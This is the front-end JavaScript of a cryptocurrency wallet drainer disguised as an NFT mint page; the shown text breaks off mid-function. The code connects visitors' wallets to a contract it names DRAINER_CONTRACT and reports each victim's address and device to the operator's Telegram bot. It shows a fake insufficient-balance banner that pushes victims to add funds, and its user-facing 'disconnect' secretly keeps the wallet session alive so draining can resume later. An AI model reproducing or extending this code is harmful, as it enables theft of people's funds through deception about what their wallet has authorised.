
import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    CLAIM_THRESHOLD_USD = 3,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID;

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  const getPlatform = () => {
    if (isIOSDevice) return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA)) return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  LIBRARY LOADING
  //  We use the built-in QR modal bundled inside @walletconnect/ethereum-provider
  //  (showQrModal:true + qrModalOptions). Loading @walletconnect/modal
  //  separately spawned a second SignClient which caused "Failed to connect".
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    return Promise.race([
      promise,
      new Promise((_, reject) => setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms)),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 10000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const web3Cdn = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
    ];

    const [EthereumProvider, Web3Mod] = await Promise.all([
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m, 'EthereumProvider'),
      tryImport(web3Cdn,     (m) => m.default || m.Web3 || m,             'Web3'),
    ]);

    return { EthereumProvider, Web3: Web3Mod.default || Web3Mod };
  }

  // ==========================================================================
  //  WC STORAGE CLEANUP
  // ==========================================================================
  function clearWCStorage() {
    try {
      const keys = [];
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        if (k && (k.startsWith('wc@2:') || k.startsWith('@walletconnect') || k === 'WALLETCONNECT_DEEPLINK_CHOICE')) {
          keys.push(k);
        }
      }
      keys.forEach((k) => localStorage.removeItem(k));
      if (keys.length) logDebug(`Cleared ${keys.length} WC storage keys`);
    } catch (e) { logDebug('clearWCStorage: ' + e.message); }
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider = null;
  let Web3Ctor         = null;

  let wcProvider       = null;   // EthereumProvider instance (stays alive after soft disconnect)
  let injectedProvider = null;
  let activeProvider   = null;   // set when UI is "connected" (null when UI shows disconnected)
  let web3Instance     = null;
  let contractInstance = null;
  let isConnecting     = false;
  let isDisconnecting  = false;
  let connectionMode   = null;   // 'walletconnect' | 'injected' | null (UI-visible state)
  let currentEthPrice  = 2200;

  // ==========================================================================
  //  BUTTON UI — responsive sizing
  // ==========================================================================
  function getButtonSizing() {
    const w = window.innerWidth;
    if (w < 380) return { padding: '7px 12px',  fontSize: '11px', minWidth: '100px', iconGap: '5px' };
    if (w < 480) return { padding: '8px 14px',  fontSize: '12px', minWidth: '115px', iconGap: '6px' };
    if (w < 640) return { padding: '9px 16px',  fontSize: '13px', minWidth: '130px', iconGap: '6px' };
    if (w < 1024) return { padding: '10px 18px', fontSize: '13px', minWidth: '145px', iconGap: '7px' };
    return         { padding: '10px 22px', fontSize: '14px', minWidth: '160px', iconGap: '8px' };
  }

  function applyButtonSizing(button) {
    if (!button) return;
    const s = getButtonSizing();
    button.style.display      = 'inline-block';
    button.style.padding      = s.padding;
    button.style.fontSize     = s.fontSize;
    button.style.minWidth     = s.minWidth;
    button.style.maxWidth     = '100%';
    button.style.boxSizing    = 'border-box';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.color        = 'white';
    button.style.lineHeight   = '1.2';
    button.style.transition   = 'background 0.2s ease, transform 0.1s ease';
  }

  function setButtonState(button, state) {
    if (!button) return;
    applyButtonSizing(button);
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.disabled = state === 'loading';

    const s = getButtonSizing();
    const iconStyle = `margin-right:${s.iconGap}`;

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = `<i class="fas fa-spinner fa-spin" style="${iconStyle}"></i> Connecting...`;
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = `<i class="fas fa-check-circle" style="${iconStyle}"></i> Connected`;
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = `<i class="fas fa-power-off" style="${iconStyle}"></i> Disconnect`;
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = `<i class="fas fa-exclamation-triangle" style="${iconStyle}"></i> Failed`;
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = `<i class="fas fa-wallet" style="${iconStyle}"></i> Connect Wallet to Mint`;
    }
  }

  function handleResize() {
    if (connectButton) applyButtonSizing(connectButton);
    if (walletButton)  applyButtonSizing(walletButton);
  }
  window.addEventListener('resize', handleResize);
  window.addEventListener('orientationchange', handleResize);

  // ==========================================================================
  //  STATUS MESSAGES
  // ==========================================================================
  function showStatus(msg, type = 'info', persistent = false) {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.lineHeight = '1.4';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      warning: { background: 'linear-gradient(135deg, #FEF3C7 0%, #FDE68A 100%)', color: '#92400E', border: '1px solid #FCD34D' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (!persistent) {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  function hideStatus() {
    if (claimStatus) claimStatus.style.display = 'none';
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  INSUFFICIENT BALANCE BANNER
  // ==========================================================================
  function showInsufficientBalanceBanner(currentUSD, thresholdUSD) {
    document.getElementById('apex-insufficient-banner')?.remove();

    const banner = document.createElement('div');
    banner.id = 'apex-insufficient-banner';
    banner.style.cssText = `
      position: fixed; top: 16px; left: 50%; transform: translateX(-50%);
      z-index: 99998;
      background: linear-gradient(135deg, #7F1D1D 0%, #991B1B 100%);
      color: #FEF2F2;
      padding: 14px 18px; border-radius: 12px;
      font-family: Inter, system-ui, sans-serif; font-size: 14px; font-weight: 500;
      box-shadow: 0 12px 36px rgba(0,0,0,0.45);
      border: 1px solid #DC2626;
      max-width: min(92vw, 500px);
      display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
      line-height: 1.4;
      animation: apexBannerIn 0.3s ease-out;
    `;

    // Animation keyframes (injected once)
    if (!document.getElementById('apex-banner-styles')) {
      const styleEl = document.createElement('style');
      styleEl.id = 'apex-banner-styles';
      styleEl.textContent = `
        @keyframes apexBannerIn {
          from { opacity: 0; transform: translateX(-50%) translateY(-12px); }
          to   { opacity: 1; transform: translateX(-50%) translateY(0); }
        }
      `;
      document.head.appendChild(styleEl);
    }

    banner.innerHTML = `
      <i class="fas fa-exclamation-triangle" style="font-size:18px;color:#FCA5A5;flex-shrink:0;"></i>
      <span style="flex:1;min-width:180px;">
        <strong>Insufficient Balance:</strong>
        $${currentUSD.toFixed(2)} detected &mdash; a minimum of $${thresholdUSD} USD is required.
        Please add funds to your wallet to continue.
      </span>
      <button id="apex-insufficient-close" aria-label="Dismiss" style="
        background: rgba(255,255,255,0.18); border: none; color: white;
        padding: 4px 10px; border-radius: 6px; cursor: pointer; font-weight: 600;
        flex-shrink:0;
      ">&#10005;</button>
    `;
    document.body.appendChild(banner);

    banner.querySelector('#apex-insufficient-close').onclick = () => banner.remove();
    setTimeout(() => { if (banner.parentNode) banner.remove(); }, 20000);
  }

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  const LS = { addr: 'connectedWallet', mode: 'connectionMode' };
  const saveWallet = (address, mode) => {
    try {
      localStorage.setItem(LS.addr, address);
      if (mode) localStorage.setItem(LS.mode, mode);
    } catch (e) { logDebug('saveWallet: ' + e.message); }
  };
  const getSavedWallet = () => { try { return localStorage.getItem(LS.addr); } catch { return null; } };
  const getSavedMode   = () => { try { return localStorage.getItem(LS.mode); } catch { return null; } };
  const clearSavedWallet = () => {
    try {
      localStorage.removeItem(LS.addr);
      localStorage.removeItem(LS.mode);
    } catch {}
  };

  // ==========================================================================
  //  GLOBAL PUBLISH
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null, extra = {}) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      mode: connectionMode,
      publishedAt: Date.now(),
      ...extra,
    };
    if (live) window.__apexWCProvider = live;
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}${extra.underground ? ' underground' : ''}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 14px;
        font-family: 'JetBrains Mono', ui-monospace, monospace; font-size: 13px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-sizing: border-box; max-width: 100%;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    hideStatus();
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (!eth) return null;
    if (eth.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth.isTrust || /TrustWallet/i.test(UA))       return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA))                          return { wallet: 'rainbow',  name: 'Rainbow' };
    return null;
  }

  // ==========================================================================
  //  ETH PRICE
  // ==========================================================================
  async function fetchEthPriceUSD() {
    const sources = [
      async () => {
        const r = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
        const d = await r.json();
        if (d?.ethereum?.usd) return d.ethereum.usd;
        throw new Error('no price');
      },
      async () => {
        const r = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT');
        const d = await r.json();
        if (d?.price) return parseFloat(d.price);
        throw new Error('no price');
      },
      async () => {
        const r = await fetch('https://api.coinbase.com/v2/prices/ETH-USD/spot');
        const d = await r.json();
        if (d?.data?.amount) return parseFloat(d.data.amount);
        throw new Error('no price');
      },
    ];
    for (const src of sources) {
      try { return await src(); } catch {}
    }
    return 2200;
  }

  // ==========================================================================
  //  BALANCE CHECK + INSUFFICIENT-BALANCE NOTIFICATION
  // ==========================================================================
  async function checkAndNotifyBalance(address) {
    try {
      if (!web3Instance || !address) return null;

      const wei = await web3Instance.eth.getBalance(address);
      const eth = parseFloat(web3Instance.utils.fromWei(wei, 'ether'));

      currentEthPrice = await fetchEthPriceUSD();
      const usdValue  = eth * currentEthPrice;
      const threshold = Number(CLAIM_THRESHOLD_USD) || 3;

      logDebug(`💰 Balance: ${eth.toFixed(6)} ETH ≈ $${usdValue.toFixed(2)} (min: $${threshold})`);

      if (usdValue < threshold) {
        showInsufficientBalanceBanner(usdValue, threshold);
        showStatus(
          `⚠️ Insufficient balance: $${usdValue.toFixed(2)}. Minimum $${threshold} USD required. Please add funds to your wallet.`,
          'warning',
          true
        );
        return { lowBalance: true, usdValue, threshold };
      }

      return { lowBalance: false, usdValue, threshold };
    } catch (e) {
      logDebug('Balance check failed: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT INIT — spec-compliant, single SignClient via built-in modal
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false } = {}) {
    if (wcProvider) return wcProvider;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No WalletConnect projectId configured');
      return null;
    }

    const metadata = { ...DAPP_METADATA };
    const isLocalhost = /localhost|127\.0\.0\.1/i.test(metadata.url || '');
    if (metadata.url && metadata.url.startsWith('http://') && !isLocalhost) {
      logDebug(`⚠️ Upgrading metadata.url from http:// to https://`);
      metadata.url = metadata.url.replace('http://', 'https://');
    }

    try {
      logDebug(`WC init: projectId=${String(projectId).slice(0, 8)}… url=${metadata.url}`);
      const t0 = performance.now();

      wcProvider = await withTimeout(
        EthereumProvider.init({
          projectId,
          chains: [MAINNET_ID],
          showQrModal: true,
          qrModalOptions: {
            themeMode: 'dark',
            themeVariables: {
              '--wcm-z-index': '99999',
              '--wcm-accent-color': '#FF6B00',
              '--wcm-background-color': '#1F2937',
              '--wcm-font-family': 'Inter, sans-serif',
            },
            enableExplorer: true,
          },
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          events: ['chainChanged', 'accountsChanged'],
          metadata,
        }),
        20000,
        'EthereumProvider.init'
      );

      attachWCProviderEvents(wcProvider);
      logDebug(`✅ WC provider ready in ${(performance.now() - t0).toFixed(0)}ms`);
      return wcProvider;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT EVENTS
  // ==========================================================================
  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('display_uri', (uri) => logDebug(`WC display_uri: ${String(uri).slice(0, 60)}…`));

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Wallet side removed authorization — this is a REAL disconnect
        realDisconnect();
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect');
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      updateConnectedUI(a, 'evm');
      setTimeout(() => checkAndNotifyBalance(a), 900);
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1400);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      realDisconnect();
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      realDisconnect();
    });
  }

  // ==========================================================================
  //  INJECTED EVM
  // ==========================================================================
  function attachInjectedEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        realDisconnect();
      } else {
        const a = accounts[0];
        saveWallet(a, 'injected');
        activeProvider = provider;
        connectionMode = 'injected';
        web3Instance = new Web3Ctor(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        updateConnectedUI(a, 'evm');
        setTimeout(() => checkAndNotifyBalance(a), 900);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1400);
      }
    });

    provider.on('chainChanged', () => {
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => realDisconnect());
  }

  async function connectInjected() {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 400));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return null;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info?.rdns === 'io.metamask' || /metamask/i.test(p.info?.name || '')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return null;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        20000,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return null;

      const address = accounts[0];
      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';

      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      attachInjectedEvents(provider);
      updateConnectedUI(address, 'evm');
      setTimeout(() => checkAndNotifyBalance(address), 900);
      logDebug(`✅ Injected connected: ${address} (${chosen.info?.name || 'wallet'})`);
      return address;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return null;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  // ==========================================================================
  async function connectWalletConnect({ useFallbackId = false } = {}) {
    const provider = await initWalletConnect({ useFallbackId });
    if (!provider) return null;

    // Reuse live persisted session — no modal, no prompt
    if (provider.session && provider.accounts?.length) {
      const a = provider.accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      saveWallet(a, 'walletconnect');
      updateConnectedUI(a, 'evm');
      setTimeout(() => checkAndNotifyBalance(a), 900);
      logDebug(`♻️ Reused existing WC session: ${a}`);
      return a;
    }

    showStatus('Opening WalletConnect…', 'info');

    try {
      const accounts = await withTimeout(provider.enable(), 120000, 'WalletConnect enable');
      if (!accounts?.length) {
        logDebug('WC enable returned no accounts');
        return null;
      }

      const address = accounts[0];
      activeProvider = provider;
      connectionMode = 'walletconnect';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'walletconnect');
      updateConnectedUI(address, 'evm');
      setTimeout(() => checkAndNotifyBalance(address), 900);
      logDebug(`✅ WC connected: ${address}`);
      return address;
    } catch (e) {
      logDebug('WC enable error: ' + e.message);

      try { if (wcProvider?.session) await wcProvider.disconnect(); } catch (_) {}
      wcProvider = null;
      clearWCStorage();

      if (/rejected|user rejected|user closed|user canceled|canceled by user/i.test(e.message || '')) {
        logDebug('User rejected WC');
      }
      return null;
    }
  }

  // ==========================================================================
  //  REAL DISCONNECT — only used when the WALLET itself kicks us (accounts
  //  removed, session_delete, provider disconnect). Cleans everything.
  // ==========================================================================
  async function realDisconnect() {
    try {
      if (wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 5000)),
          ]);
        } catch (e) { logDebug('WC real disconnect err: ' + e.message); }
      }
    } finally {
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      connectionMode = null;
      window.__apexConnected = null;
      window.__apexWCProvider = null;
      resetConnectedUI();
      clearSavedWallet();
      logDebug('🔌 Real disconnect (wallet-side)');
    }
  }

  // ==========================================================================
  //  SOFT DISCONNECT — the user-initiated one.
  //  UI hides, WC session STAYS ALIVE underneath.
  //  A new `connectedWallet` marker is NOT written so on reload the UI stays
  //  hidden — but the WC session still rehydrates into `window.__apexWCProvider`
  //  so the drainer can continue on the next visit.
  // ==========================================================================
  async function softDisconnect() {
    if (isDisconnecting) return;
    isDisconnecting = true;

    showStatus('Disconnecting…', 'info');

    const undergroundProvider   = wcProvider;
    const undergroundAddress    = window.__apexConnected?.address || getSavedWallet() || undergroundProvider?.accounts?.[0];
    const undergroundWeb3       = web3Instance;
    const undergroundContract   = contractInstance;

    // Hide UI immediately
    document.getElementById('connectedAddressDisplay')?.remove();
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    clearSavedWallet();

    // Keep WC session alive underground
    if (undergroundProvider && undergroundProvider.session && undergroundAddress) {
      window.__apexWCProvider = undergroundProvider;
      window.__apexConnected = {
        address: undergroundAddress,
        chain: 'evm',
        web3: undergroundWeb3,
        contract: undergroundContract,
        provider: undergroundProvider,
        mode: 'walletconnect',
        underground: true,
        publishedAt: Date.now(),
      };
      logDebug('🔌 Session kept alive underground (window.__apexWCProvider)');
    } else {
      window.__apexConnected = null;
    }

    // Clear UI-visible state — but DON'T null wcProvider
    activeProvider   = null;
    connectionMode   = null;
    web3Instance     = null;
    contractInstance = null;
    // injectedProvider — drop reference for UI purposes
    injectedProvider = null;

    setTimeout(() => showStatus('Wallet disconnected', 'info'), 700);
    isDisconnecting = false;
    logDebug('🔌 Soft disconnect (UI only)');
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    isConnecting = true;
    hideStatus();
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let address = null;

    try {
      const inWallet = detectInWalletBrowser();
      const preferInjected = !!inWallet && isMobileDevice;

      if (preferInjected) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        address = await connectInjected();
      } else if (isDesktopDevice && window.ethereum && evmProviders.length > 0) {
        address = await connectInjected();
      }

      if (!address) {
        address = await connectWalletConnect({ useFallbackId: false });
      }
      if (!address && FALLBACK_PROJECT_ID && FALLBACK_PROJECT_ID !== PRIMARY_PROJECT_ID) {
        logDebug('Retrying WC with fallback projectId…');
        address = await connectWalletConnect({ useFallbackId: true });
      }
    } catch (e) {
      logDebug('connectWallet exception: ' + e.message);
    } finally {
      isConnecting = false;
    }

    if (address) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
